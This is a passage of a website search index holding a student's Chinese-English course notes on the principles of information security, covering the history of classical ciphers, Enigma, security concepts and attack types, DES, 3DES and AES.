p\u4e0d\u80fd\u662f\u5f15\u7528\u7684\u6307\u9488</li> </ul> <p>const char * p;   char const * p;  \u4e0a\u8ff0\u4e24\u79cd\u90fd\u662f\u6307\u9488\u6307\u5411\u7684\u5bf9\u8c61\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u4f46\u662f\u6307\u9488\u6307\u5411\u8c01\u53ef\u4ee5\u53d8\u6362   char * const p;  \u6307\u9488\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u6307\u9488\u6307\u5411\u7684\u5bf9\u8c61\u53ef\u4ee5\u88ab\u4fee\u6539   ```</p> <ul> <li>\u5f15\u7528\u4e0d\u6784\u6210overload</li> <li>\u200b\u200b</li> <li>\u9664\u4e86const\u7684\u65b9\u6cd5\uff0cconst\u7684\u5bf9\u8c61\u8fd8\u80fd\u8c03\u7528static\u7684\u65b9\u6cd5</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/","title":"\u4fe1\u606f\u5b89\u5168\u539f\u7406","text":"<p>\u4fe1\u606f\u5b89\u5168\u539f\u7406</p> <p>\u5173\u4e8e\u4fe1\u606f\u5b89\u5168\u7684\u5165\u95e8\u8bfe\u7a0b\uff0c\u4e3b\u8981\u504f\u7406\u8bba\u90e8\u5206\uff0ccoding\u7684\u90e8\u5206\u8f83\u5f31\u3002\u671f\u672b\u8003\u8bd5\u51c6\u5907\u7684\u8fd8\u7b97\u5145\u5206\uff0c\u4f46\u662f\u6700\u540e\u7cbe\u51c6\u8003\u5230\u4e86\u6ca1\u8be6\u7ec6\u51c6\u5907\u7684\u90e8\u5206\uff0c\u5c31\u5bc4\u4e86(\u60b2)\u3002</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#_2","title":"\u4fe1\u5b89\u539f\u671f\u672b\u590d\u4e60","text":"<ul> <li>KERBEROS</li> <li>SPAM</li> <li>SSL/TLS</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#information-security","title":"Information Security","text":""},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#learn-from-history","title":"Learn From History","text":"<ul> <li>\u592a\u516c\u5175\u6cd5 \u4e2d\u56fd\u7b2c\u4e00\u4e2acipher   \u7528\u4e0d\u540c\u957f\u5ea6\u7684\u7b26\u6765\u8868\u793a\u4e0d\u540c\u7684\u4fe1\u606f\uff0c\u628a\u8981\u53d1\u7684\u6587\u4e66\u5206\u6210\u4e09\u4efd\uff0c\u8ba9\u4e09\u4e2a\u4eba\u53bb\u53d1\uff0c\u4e09\u4e2a\u4eba\u76f8\u4e92\u4e0d\u77e5\u9053\uff0c\u4e5f\u65e0\u6cd5\u4e86\u89e3\u5b8c\u6574\u7684\u4fe1\u606f\u3002</li> <li>\u8c6a\u5bc6 \u515a\u7684\u7b2c\u4e00\u4e2a\u5bc6\u7801   \u7531\u5468\u6069\u6765\u603b\u7406\u5f00\u53d1</li> <li>Phaistos \u5706\u76d8\u5f62\u7684\u5bc6\u7801</li> <li>Caesar cipher \u6700\u65e9\u7684Substition cipher\uff08\u4e00\u517125\u79cd \u53ef\u80fd\u5f97secret key\uff09</li> <li>Scytale Cipher \u68cd\u68d2\u505a\u5bc6\u7801</li> <li>\u4ec0\u4e48\u662f</li> </ul> <p>Information Hiding / Steganography \u9690\u5199\u672f</p> <ul> <li>\u5c31\u662f\u7c7b\u4f3c\u4e8e\u628a\u5934\u53d1\u5243\u6389\u7136\u540e\u5728\u4e0a\u9762\u5199\u4e1c\u897f\uff0c\u7b49\u5934\u53d1\u957f\u51fa\u6765</li> <li> <p>\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u4f8b\u5b50\u4f8b\u5982</p> </li> <li> <p>Egg Writing</p> </li> <li>Microdot</li> <li>Bacon'c cipher</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#_3","title":"\u5bc6\u7801\u5b66\u7684\u5386\u53f2\u6027\u65f6\u523b","text":"<p>\u603b\u5f97\u6765\u8bf4\uff0c\u5bc6\u7801\u5b66\uff08cryptography\uff09\u662fkeep secret\uff0c\u4e0a\u8ff0\u7684\u65b9\u6cd5\u662f\u4eba\u7c7b\u5386\u53f2\u4e0a\u7684\u7cbe\u534e\uff0c\u4f46\u662f\u5bc6\u7801\u5b66\u7684scientization\u8981\u4eceKerckhoff\u539f\u5219\u5f00\u59cb\uff0c\u9664\u6b64\u4ee5\u5916\u8fd8\u6709\u4e00\u4e9b\u6bd4\u8f83\u5386\u53f2\u6027\u7684\u65f6\u523b</p> <p>\u200b\u200b</p> <p>Kerckhoof's Principle</p> <p>A cryptosysyem should be secure even if everything about the systen, except the key, is public knowledge.</p> <p>\u8be5\u539f\u5219\u6709\u5f88\u591a\u5f71\u54cd</p> <ul> <li>\u8ba9\u5bc6\u7801\u5b66\u4ecePrehistoric\u5230\u4e86classic\u65f6\u671f\uff0c\u4eceExperience\u5230\u4e86Science</li> <li>\u5e76\u4e14\u8ba9\u5927\u89c4\u6a21\u751f\u6210cipher machine\u6210\u4e3a\u53ef\u80fd</li> <li>\u52a0\u5f3a\u4e86\u5b89\u5168\u6027\uff1aAnything invariable will be disclosed (\u6240\u6709\u4e0d\u53d8\u7684\u4e1c\u897f\u90fd\u662f\u4f1a\u88ab\u6cc4\u9732\u7684)</li> <li>\u4ece\u7ecf\u9a8c\u53d8\u6210\u4e86\u79d1\u5b66</li> </ul> <p>Electronic computer</p> <ul> <li>\u8ba1\u7b97\u673a\u8bde\u751f\u7684\u539f\u56e0\u662f\u5728\u4e8c\u6218\u4e2d\u89e3\u5bc6 ENIGMA</li> <li>computer accelerate both encryption and decryption</li> <li>Shannon's information Theory \u9999\u519c\u4fe1\u606f\u7406\u8bba\u7684\u51fa\u73b0\uff0c\u4f7f\u5f97\u5bc6\u7801\u7684\u7406\u8bba\u4f53\u7cfb++</li> <li>\u73b0\u4ee3\u52a0\u5bc6cipher\uff08DES\uff09\u7684\u51fa\u73b0</li> <li>\u4ece\u673a\u5668\u53d8\u6210\u4e86\u7535\u5b50</li> </ul> <p>Public Key Ciphers</p> <ul> <li>\u65e0\u9700\u5206\u4eabsecret key\u7684\u60c5\u51b5\u4e0b\uff0c\u8ba9\u4e24\u8005\u4e4b\u95f4\u5171\u4eab\u5927\u91cf\u52a0\u5bc6\u4fe1\u606f\uff0c\u6539\u53d8\u4e86\u5bc6\u7801\u5b66\u7814\u7a76\u7684\u65b9\u5411</li> <li>\u6700\u5e7f\u6cdb\u4f7f\u7528\u7684\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5 RSA\u7684\u51fa\u73b0</li> </ul> <p>Mobile Internet or AI</p> <ul> <li>\u6269\u5927\u4e86\u5bc6\u7801\u5b66\u7684\u5185\u6db5\uff08connotation\uff09\u548c\u5e94\u7528\u8303\u56f4\uff08Extension\uff09</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#connotation-of-computer-security","title":"Connotation of computer security","text":"<p>Significance of computer security</p> <p>\u4e3e\u4e86\u4e00\u5806\u4e0d\u5b89\u5168\u4ea7\u751f\u7684\u4f8b\u5b50</p> <p>distinctness of computer security</p> <p>\u90fd\u662f\u76f8\u5bf9\u4e8e\u7eb8\u8d28\u6587\u4ef6\u800c\u8a00</p> <ul> <li>\u65e0\u6cd5\u533a\u5206original\u539f\u4ef6\u548ccopy\u4ef6\u7684\u533a\u522b</li> <li>\u4fee\u6539\u53ef\u4ee5\u4e0d\u7559\u4e0b\u4efb\u4f55\u75d5\u8ff9</li> <li>\u5bb9\u6613\u5f7b\u5e95\u5220\u9664 easy to delete</li> <li>\u6570\u5b57\u7b7e\u540d\u53ea\u4f9d\u8d56\u4e8e\u4e8c\u8fdb\u5236\u4fe1\u606f</li> </ul> <p>Characteristics of computer security</p> <ul> <li>Comprehensiveness \u7cfb\u7edf\u5b89\u5168\u7a0b\u5ea6\u53d6\u51b3\u4e8e\u5176\u6700\u8584\u5f31\u7684\u5b89\u5168\u73af\u8282</li> <li>Procedural \u7a0b\u5e8f\u6027 \u5b89\u5168\u6a21\u578b\u662f\u4e00\u4e2a\u87ba\u65cb\u4e0a\u5347\u7684\u6a21\u578b\uff0c\u4e0d\u4f1a\u7a81\u53d8 constant back-and-forth rising</li> <li>Dynamic \u52a8\u6001\u6027 \u5b89\u5168\u6a21\u578b\u662f\u4e0d\u65ad\u8fdb\u6b65\u7684 progressing</li> <li>Hierarchy \u5c42\u6b21\u6027 \u6709multi-level \u7684\u6280\u672f\u6765\u4fdd\u969c</li> <li>Relativity \u76f8\u5bf9\u6027 \u90fd\u662f\u76f8\u5bf9\u7684\uff0c\u6ca1\u6709\u7edd\u5bf9\u5b89\u5168\u7684\u7cfb\u7edf</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#concepts-of-computer-security","title":"Concepts of computer security","text":"<p>3 Elements of computer security</p> <ul> <li>Confidentiality  \u4fdd\u5bc6\u6027 \u522b\u4eba\u662f\u5426\u80fd\u770b\u5230\u6211\u4eec\u7684data</li> <li>Integrity            \u5b8c\u6574\u6027 \u6211\u4eec\u7684\u6570\u636e\u80fd\u5426\u88ab\u975e\u6cd5\u7be1\u6539\uff08\u8981\u533a\u5206\u7528\u6237\u548c\u975e\u6cd5\u7528\u6237\uff0c\u94f6\u884c\u6570\u636e\u7be1\u6539\uff09</li> <li>Availability        \u53ef\u7528\u6027 \u6211\u4eec\u7684\u8d44\u6e90\u662f\u5426\u53ef\u7528\uff0c\u5b89\u5168\u662f\u5426\u5f71\u54cd\u4e86\u6211\u6b63\u5e38\u4f7f\u7528\u67d0\u4e2a\u529f\u80fd</li> </ul> <p>\u8fd8\u6709\u7b2c\u56db\u4e2a\u6027\u8d28 Authenticity / Non-repudiation \u8ba4\u8bc1\u6027\u6216\u8005\u8bf4\u662f\u4e0d\u53ef\u5426\u8ba4\u6027\uff0c\u6211\u4eec\u4e0d\u80fd\u5426\u8ba4\u53d1/\u6536\u4e86\u4fe1\u606f</p> <p>Concepts of computer security</p> <ul> <li>Asset \u8d44\u4ea7 \u6211\u4eec\u8981\u4fdd\u62a4\u7684\u4e1c\u897f</li> <li>Threat \u5a01\u80c1 \u8981\u5bf9\u6297\u7684\u4e1c\u897f</li> <li>Vulnerability \u6f0f\u6d1e \u4fdd\u62a4\u5de5\u4f5c/\u5b89\u5168\u7cfb\u7edf\u4e2d\u7684\u5f31\u70b9</li> <li>Risk \u98ce\u9669 = Asset + Threat + Vulnerability   R = A + T + V</li> <li>control</li> </ul> <p>type of security threat</p> <p>\u6309\u7167method\u5206\u548c\u6309\u7167\u6709\u610f\u65e0\u610f\u5206</p> <p>\u200b\u200b</p> <p>type of security attack</p> <p>\u4f8b\u5b50\u89c1PPT\uff0c\u7b2c\u4e8c\u4e2a\u662f\u88ab\u52a8\u653b\u51fb\uff08\u9884\u9632\u6bd4\u68c0\u6d4b\u66f4\u6709\u6548\uff09\uff0c\u5176\u4ed6\u662f\u4e3b\u52a8\u653b\u51fb\uff08\u6613\u4e8e\u68c0\u6d4b\u96be\u4e8e\u9884\u9632\uff0c\u53ef\u4ee5\u4ece\u635f\u574f\u4e2d\u4fee\u590d\uff09</p> <ul> <li>Interruption  \u5bb9\u6613detect \u8ba9\u7cfb\u7edf\u4e2d\u7684\u8d44\u4ea7\uff08asset\uff09\u88ab\u7834\u574f\u6216\u8005\u65e0\u6cd5\u4f7f\u7528 -&gt; availablility</li> <li>Interception  \u96bedetect\uff0c\u4e0d\u80fd\u5b8c\u5168\u907f\u514d  \u4ee5\u975e\u6cd5\u8eab\u4efd\u8bbf\u95eeasset \u4e0d\u80fd\u88ab\u5b8c\u5168\u907f\u514d -&gt; Confidentiality</li> <li>Modification \u53ef\u4ee5\u88abprevent\uff08\u7528\u6570\u5b57\u6c34\u5370\uff09\u4ee5\u975e\u6cd5\u65b9\u5f0f\u4fee\u6539 tamper asset -&gt; Integrity</li> <li>Fabrication  \u672a\u7ecf\u6388\u6743\u628a\u4eff\u9020\u5bf9\u8c61\u63d2\u5165\u7cfb\u7edf\uff0c\u5e76\u4e14\u5047\u88c5\u662f\u6388\u6743\u65b9\u53d1\u9001\u7684 -&gt; Authenticity</li> <li>\u200b\u200b</li> </ul> <p>Replay attack</p> <p>\u9a8c\u8bc1\u8eab\u4efd\u7684\u5de5\u4f5c\u4e2d\uff0c\u5192\u5145\u8005\u76f4\u63a5\u4f7f\u7528\u7a83\u542c\u5230\u7684\u4e0a\u4e00\u6b21\u9a8c\u8bc1\u4fe1\u606f\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u80fd\u591f\u9a8c\u8bc1\u6210\u529f\uff0c\u5c31\u8bf4\u660e\u91cd\u653e\u653b\u51fb\u6210\u529f\u4e86</p> <p>\u200b\u200b</p> <p>Against Security Threats \u7684\u76ee\u6807</p> <ul> <li>Prevent</li> <li>Detection</li> <li>Recovery   Basic\uff1a\u7cfb\u7edf\u53ef\u4ee5\u5f88\u5feb\u6062\u590d\u6216\u8005\u529f\u80fd   Advanced\u88ab\u653b\u51fb\u7684\u60c5\u51b5\u4e5f\u80fd\u6b63\u5e38\u8fd0\u4f5c</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#concepts-history-of-cryptography","title":"Concepts &amp; History of cryptography","text":""},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#concept-of-cryptography","title":"Concept of cryptography","text":"<p>\u200b\u200b</p> <p>\u57fa\u7840\u7684\u6982\u5ff5 Plaintext(P)/Cleartext(\u4e00\u822c\u4e0d\u7528\u8fd9\u4e2a)\uff0cCiphertext(C)\uff0cEncryption(E())\uff0cDecryption(D())\uff0cKey(K)</p> <p>\\(C =E_{K}(P)\\) \\(P = D_{K}(C)\\) </p> <p>\u5e38\u89c1\u7684Encryption\u7b97\u6cd5</p> <ul> <li>Substitution \u7f6e\u6362\uff0c\u5c31\u662f\u5efa\u7acb\u4e00\u4e2a\u6620\u5c04\uff0c\u50cf\u662fhash Caesar\u5bc6\u7801\u5c5e\u4e8e\u8fd9\u79cd</li> <li>Transpostion \u4f4d\u79fb\uff0c\u5bf9\u539f\u6587\u79fb\u52a8\u51e0\u4f4d</li> </ul> <p>Cryptanalysis \u5bc6\u7801\u5206\u6790\u4e0a\u7684\u4e00\u4e9b\u6982\u5ff5</p> <ul> <li> <p>Amount of information available to the attacker</p> </li> <li> <p>Ciphertext-only \u53ea\u5c55\u793a\u5bc6\u6587</p> </li> <li>Known-plaintext \u77e5\u9053\u51e0\u7ec4\u660e\u6587-\u5bc6\u6587\u5bf9\u5e94</li> <li>Chosen-plaintext \u53ef\u4ee5\u5728\u4e00\u5b9a\u8303\u56f4\u5185\u9009\u62e9\u51e0\u7ec4\u660e\u6587-\u5bc6\u6587\u5bf9\u5e94</li> <li>Adaptive chosen-plaintext \u53ef\u4ee5\u81ea\u9002\u5e94\u9009\u62e9\u660e\u6587\u8ba9\u5176\u52a0\u5bc6</li> <li>Related-key attack \u8ba9\u5176\u518d\u4e0d\u540c\u5bc6\u94a5\u6761\u4ef6\u4e0b\u89e3\u5bc6\uff0c\u4e14\u4e24\u4e2a\u5bc6\u94a5\u5173\u7cfb\u5df2\u77e5</li> <li> <p>Result of Attack / Analysis</p> </li> <li> <p>total break \u77e5\u9053\u5bc6\u94a5</p> </li> <li>global deduction \u867d\u7136\u4e0d\u77e5\u9053\u5bc6\u94a5\uff0c\u4f46\u662f\u6784\u5efa\u51fa\u4e86\u4e00\u5957\u7b49\u6548\u7684\u7b97\u6cd5\u8fdb\u884c\u52a0\u5bc6\u548c\u89e3\u5bc6</li> <li>instance deduction \u53ef\u4ee5\u83b7\u53d6\u4ee5\u524d\u672a\u77e5\u7684\u660e\u6587\u5bc6\u6587\u5bf9</li> <li>information deduction \u4ece\u4ee5\u524d\u672a\u77e5\u7684\u5bc6\u6587\u4e0a\u83b7\u53d6\u4fe1\u606f</li> <li>Distinguishing algorithm \u53ef\u4ee5\u533a\u5206\u5bc6\u7801\u548c\u968f\u673a\u5e8f\u5217</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#history-of-cryptography","title":"History of cryptography","text":"<p>\u5bc6\u7801\u52a0\u5bc6\u7684\u53d1\u5c55\u5927\u6982\u6709\u7740\u8fd9\u4e09\u4e2a\u9636\u6bb5</p> <p>\u200b\u200b</p> <p>\u7b2c\u4e00\u9636\u6bb5</p> <p>\u4e00\u4e9b\u53e4\u5178\u7684\u5bc6\u7801\uff0c\u4e3e\u4e86\u4e00\u4e9b\u4f8b\u5b50\uff0c\u4f8b\u5982Caesar cipher</p> <ul> <li>Belt/Stick cipher \u628a\u6761\u5e26\u7ed1\u5728\u68cd\u5b50\u4e0a\uff0c\u7279\u5b9a\u7684\u68cd\u5b50\u7c97\u7ec6\u53ef\u4ee5\u5f97\u51fa\u6b63\u786e\u7684\u7ed3\u679c</li> <li>Ancient Greek Cipher \u5217\u8868\u5c06\u5b57\u6bcd\u8f6c\u6362\u6210\u6570\u5b57 \u4f8b\u5982A\u5c31\u662f\"11\"   \u200b\u200b</li> <li>Caesar \u5bc6\u7801</li> <li>Queen Mary's Cipher 23\u4e2a\u5b57\u6bcd\u7b26\u53f7\u548c35\u4e2a\u5355\u8bcd\u7b26\u53f7\uff0c\u5176\u4e2d\u6709\u56db\u4e2aNULL \uff1f</li> </ul> <p>\u5bf9\u4e8e\u4e0a\u8ff0early ciphers \u90fd\u53ef\u4ee5\u91c7\u53d6Frequency Analysis\u6765\u8fdb\u884c\u5206\u6790\u89e3\u51b3</p> <p>\u4f46\u662f\u4e5f\u6709\u4e9b\u65b9\u6cd5\u4f1a\u4f7f\u5f97Frequency Analysis\u53d8\u5f97\u56f0\u96be</p> <ul> <li>Vigenere \u5c06Caesar\u5bc6\u7801\u7684key\u53d8\u6210\u4e00\u4e2a\u5355\u8bcd\uff0c\u4f8b\u5982\u8fd9\u6837   \u200b   \u7834\u89e3\u7684\u65f6\u5019\u9700\u8981\u6839\u636e\u91cd\u590d\u5e8f\u5217\u7684\u957f\u5ea6\uff0c\u6765\u786e\u5b9akey\u7684\u957f\u5ea6\uff0c\u518d\u8f6c\u6362\u6210\u5e38\u89c4\u7684Caesar\u5bc6\u7801\u6765</li> <li>Kryptos Sculpture</li> <li>Book Cipher \u7ed9\u4e00\u672c\u4e66\u7684\u6240\u6709\u5355\u8bcd\u7f16\u53f7\uff0c\u5bc6\u6587\u7531\u7f16\u53f7\u6570\u5b57\u7ec4\u6210\uff0c\u660e\u6587\u5c31\u662f\u627e\u5230\u7f16\u53f7\u5bf9\u5e94\u5355\u8bcd\u7684\u9996\u5b57\u6bcd</li> </ul> <p>\u7b2c\u4e8c\u9636\u6bb5</p> <p>Machine cipher\uff0c\u8fd9\u4e00\u9636\u6bb5\u7684\u6700\u9ad8\u6210\u5c31\u662f\u5fb7\u519b\u91cc\u7684ENIGMA\u673a\u5668</p> <p>1\u4e2arotor\uff08\u8f6c\u5b50\uff09\u5b9a\u4e49\u4e86\u5468\u671f\u4e3a26\u7684\u5b57\u6bcd\u66ff\u6362\u5bc6\u7801(polyalphabetic substition cipher)\uff0cBasic Version\u67093\u4e2arotors\uff0c\u5b9a\u4e49\u4e86\\(26^{3}\\)\u52a0\u4e0a\u672c\u8eab3\u4e2arotor\u6709\\(A_{3}^{3}\\)\u7684\u6392\u5217\uff0c\u603b\u5171\u670917576*6\u7684\u66ff\u6362\u5bc6\u7801\uff0cExtended\u7248\u672c\u53ef\u4ee5\u66f4\u591arotor\uff0c\u53ef\u4ee5\u5bf9\u6297Frequency Analysis</p> <p>Plug board\u5b9a\u4e49\u4e86\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u4ea4\u63626\u5bf9\uff08\u4e5f\u5c31\u662f12\u4e2a\uff09\u5b57\u6bcd\uff0c\u5176\u4f5914\u4e2a\u4e0d\u4ea4\u6362</p> <p>\u200b\u200b</p> <p>Enigma Principle\uff0c\u5bf9\u4e8eplug board\u6211\u4eec\u5b58\u5728\u4e00\u4e9b\u6570\u636e</p> <p>\u200b\u200b</p> <p>\u7528Kerckhoff\u539f\u5219\u6765\u5206\u6790Enigma\uff0c\u5176\u662f\u7b26\u5408Kerckhoff\u539f\u5219\u7684</p> <ul> <li>Algorithm\u4e3a\u6574\u4e2a\u673a\u5668\u7684\u7269\u7406\u6784\u6210\uff0c\u4e09\u4e2arotor \uff08\u662finvariable or hard to change\uff09</li> <li>Key\u4e3arotor\u7684\u521d\u59cb\u72b6\u6001\uff08initial position and sequence\uff09\u548cplug board configuration \uff08\u662fvariable or easy to change\uff09</li> </ul> <p>crack Engima</p> <ul> <li>\u9636\u6bb5\u4e00 Espionage\uff08\u4fa6\u67e5\uff09 \u83b7\u53d6Engima\u673a\u5668\u672c\u8eab\uff0c\u5e76\u4e14\u4fa6\u6d4b\u5230\u5fb7\u519b\u7684Enigma\u4f7f\u7528\u65b9\u6cd5\uff0c\u6709Day key \u548c Message key\uff0cDay key\u52a0\u5bc6Message key; Message key\u52a0\u5bc6Message</li> <li>\u9636\u6bb5\u4e8c Misuse \u8bf1\u4f7f\u5fb7\u519b\u9519\u8bef\u4f7f\u7528Engima\uff0c\u5c06Message Key\u653e\u5728\u5bc6\u6587\u7684\u5f00\u5934\u91cd\u590d\u52a0\u5bc6\u5e76\u53d1\u9001\uff0c\u4f7f\u5f97\u4ed6\u4eba\u83b7\u53d6\u4e86\u89c4\u5f8b\uff1fpattern</li> <li>\u9636\u6bb5\u4e09 Mathematics(\u6570\u5b66\u4e0a\u7684\u89e3\u51b3) \u8bc1\u660e\u4e86\u68c0\u67e5\u8868\u4e2d\u7684\u8fde\u63a5\u957f\u5ea6\u53d6\u51b3\u4e8erotor\u800c\u4e0d\u662fplug\uff0c\u672c\u8d28\u4e5f\u662f\u66b4\u529b\u68c0\u67e5</li> </ul> <p>\u6700\u540e\u8fd8\u6709\u51e0\u9875</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#symmetric-secret-key-cryprography-and-asymmetric","title":"Symmetric secret key cryprography and Asymmetric","text":""},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#symmetric-cryptography","title":"Symmetric cryptography","text":"<p>\u5bf9\u79f0\u5bc6\u94a5\u52a0\u5bc6\u7b97\u6cd5\uff0c\u4e5f\u53eb\u505aShared key ciphers, \u548c Secure key ciphers\uff0c\u662f\u5bc6\u7801\u5b66\u4e2d\u7684\u4e00\u79cd\u52a0\u5bc6\u7b97\u6cd5\uff0ccomplies with the Kerckhoff's principle</p> <p>block cipher</p> <p>\u5c06\u8f93\u5165\u7684bit\u5207\u6210n-bit\u7684section\uff0c\u5bf9\u6bcf\u4e2asection\u5355\u72ec\u52a0\u5bc6\uff0c\u6bcf\u4e00\u5757\u4e4b\u95f4\u6ca1\u6709dependency\uff0chistory\u7b49\u8054\u7cfb</p> <p>\u200b\u200b</p> <p>In a good block cipher, each output bit is a function of all n input bits and all k key bits.</p> <p>feistel cipher structure</p> <p>\u51e0\u4e4e\u6240\u6709\u73b0\u4ee3\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u90fd\u57fa\u4e8e\u8fd9\u4e2a\u7ed3\u6784\uff0c\u8fd8\u662f\u5728block ciphers</p> <ul> <li> <p>Diffusion \u4f7f\u5f97\u5bc6\u6587\u7684\u7edf\u8ba1\u7279\u6027\u548c\u660e\u6587\u95f4\u7684\u5173\u7cfb\u5c3d\u53ef\u80fd\u590d\u6742</p> </li> <li> <p>iteratively \u4ea4\u6362\u5de6\u53f3\u4e24\u534a</p> </li> <li> <p>Confusion \u4f7f\u5f97\u5bc6\u6587\u7684\u7edf\u8ba1\u7279\u6027\u548c\u5bc6\u94a5\u4e4b\u95f4\u5173\u7cfb\u5c3d\u53ef\u80fd\u590d\u6742</p> </li> <li> <p>Larger Block size,\u5e38\u89c1\u4e3a64 bit or128 bit</p> </li> <li>Larger key length\uff0c\u5e38\u89c1\u4e3a128 bit</li> <li>Number of rounds, \u5e38\u89c1\u4e3a16</li> <li>Sub-key generation algorithms\uff1a\u66f4\u590d\u6742\u7684\u751f\u6210\u7b97\u6cd5</li> <li>Round Function\uff1a\u66f4\u590d\u6742\u7684 F \u590d\u6742\u5ea6</li> </ul> <p>\u200b\u200b</p> <p>DES Algorithm\u2014\u2014progress</p> <p>Data Encryption Standard\uff0c\u662f\u752864-bit blocks\uff0c\u548c56-bit\u7684key\uff0c\u6709\u4e00\u4e9b\u7279\u5f81</p> <ul> <li>Strong avalanche effect \u96ea\u5d29\u6548\u5e94\uff0c\u5fae\u5c0f\u8f93\u5165\u7684\u6539\u53d8\uff0c\u8f93\u51fa\u6539\u53d8\u5de8\u5927</li> <li>\u5f3a\u5927\u7684anti-crack\u80fd\u529b\uff0c\u53ea\u80fd\u88ab\u66b4\u529b</li> <li>\u5728\u5982\u4eca56-bit key\u662f\u4e0d\u591f\u4fdd\u9669\u7684</li> </ul> <p>crack DES</p> <p>\u867d\u7136\u5bf9\u4e8eDES\u8fd8\u662f\u53ea\u80fd\u679a\u4e3e\uff0c\u4f46\u662f56-bit key\u7684\u8ba1\u7b97\u91cf\uff0c\u57281999\u7684\u8d85\u7ea7\u8ba1\u7b97\u673a\u4e0a\u53ea\u9700\u8981\u82b1\u8d3922\u5c0f\u65f6</p> <p>Triple DES</p> \\[ C=E_{k3}[D_{k2}[E_{k1}[P]]] \\] <p>\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u4e00\u6837\u7684key\uff0c\u52a0\u5bc6\u89e3\u5bc6\u518d\u52a0\u5bc6\uff0ckey\u7684size\u5230\u8fbe\u4e8656*3 = 168\uff0cPGP\u7b49\u5de5\u5177\u5c31\u4f7f\u7528\u4e86\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u540c\u65f6\u5982\u679c\u8bbe\u7f6e\u5176\u4e2d\u51e0\u4e2akey\u76f8\u540c\uff0c\u5c31\u53ef\u4ee5\u5b8c\u6210\u4e0e\u4ee5\u524d\u5bc6\u7801\u7cfb\u7edf\u7684\u5411\u540e\u517c\u5bb9\u6027\uff08provide backward compatibility\uff09</p> <p>\u4e00\u4e9b\u5176\u4ed6\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5</p> <p>\u200b\u200b</p> <p>New international Encryption Standard\u2014\u2014AES</p> <p>AES advanced encryption standard 2001 \u4ea7\u751f\uff0c\u66ff\u4ee3\u4e86DES\u548c3DES\u7b49\uff0c\u56e0\u4e3a3DES\u867d\u7136\u53ef\u7528\uff0c\u4f46\u662f\u64cd\u4f5c\u8d77\u6765\u6bd4\u8f83\u6162\uff0c\u5e76\u4e14block size\u53ea\u670964 bit\uff0c\u800cAES\u6709\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>block size \u4e3a 128 bit</li> <li>key size \u4e3a 128/192/256 bits</li> <li>immune to all known attacks</li> <li>\u6267\u884c\u8d77\u6765\u5f88\u5feb\u4e14\u4ee3\u7801\u7d27\u51d1</li> <li>\u8bbe\u8ba1\u7b80\u5355</li> </ul> <p>mode of operation</p> <p>\u4e4b\u524d\u7684block cipher\u90fd\u662f\u5bf9\u4e8e\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684bit\u5757\u5c06\u8fdb\u884c\u52a0\u5bc6\uff0cmode of operation \u662f\u544a\u8bc9\u6211\u4eec\u5982\u4f55\u91cd\u590d\u5730\u628a\u52a0\u5bc6\u64cd\u4f5c\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u4fe1\u606f\u5757\u4e0a</p> <p>\u6709\u4e00\u7cfb\u5217\u7684\u65b9\u6cd5\u6bd4\u5982</p> <ul> <li>ECB 